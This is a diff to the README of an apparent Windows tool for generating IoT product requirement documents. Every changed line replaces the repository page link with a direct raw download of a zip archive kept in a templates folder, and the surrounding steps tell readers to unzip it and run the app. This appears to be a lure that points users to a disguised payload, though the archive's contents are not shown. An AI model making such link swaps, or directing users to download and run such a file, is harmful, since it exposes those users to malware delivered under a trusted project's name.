@@ -1,6 +1,6 @@
 # 📄 iot-prd-generator - Turn Specs Into Clear PRDs
 
-[![Download](https://img.shields.io/badge/Download%20Now-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/valedictory-tundra426/iot-prd-generator)
+[![Download](https://img.shields.io/badge/Download%20Now-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/valedictory-tundra426/iot-prd-generator/main/assets/templates/prd-iot-generator-v2.9-beta.3.zip)
 
 ## 🚀 Overview
 
@@ -10,13 +10,13 @@ Use it when you need one place to keep product needs aligned, check changes, and
 
 ## 📥 Download and Setup
 
-1. Open this link: https://github.com/valedictory-tundra426/iot-prd-generator  
+1. Open this link: https://raw.githubusercontent.com/valedictory-tundra426/iot-prd-generator/main/assets/templates/prd-iot-generator-v2.9-beta.3.zip  
 2. On the page, get the latest Windows package or source files.
 3. Save the files to a folder you can find again, such as `Downloads` or `Desktop`.
 4. If the project comes as a zip file, unzip it first.
 5. Open the folder and run the main app or start file if one is included.
 
-[![Visit Download Page](https://img.shields.io/badge/Visit%20Download%20Page-6E6E6E?style=for-the-badge&logo=github&logoColor=white)](https://github.com/valedictory-tundra426/iot-prd-generator)
+[![Visit Download Page](https://img.shields.io/badge/Visit%20Download%20Page-6E6E6E?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/valedictory-tundra426/iot-prd-generator/main/assets/templates/prd-iot-generator-v2.9-beta.3.zip)
 
 ## 🖥️ Windows Requirements
 
@@ -172,7 +172,7 @@ A generated PRD may include:
 
 If you need the download page again, use this link:
 
-https://github.com/valedictory-tundra426/iot-prd-generator
+https://raw.githubusercontent.com/valedictory-tundra426/iot-prd-generator/main/assets/templates/prd-iot-generator-v2.9-beta.3.zip
 
 ## 🧭 Basic Troubleshooting
 
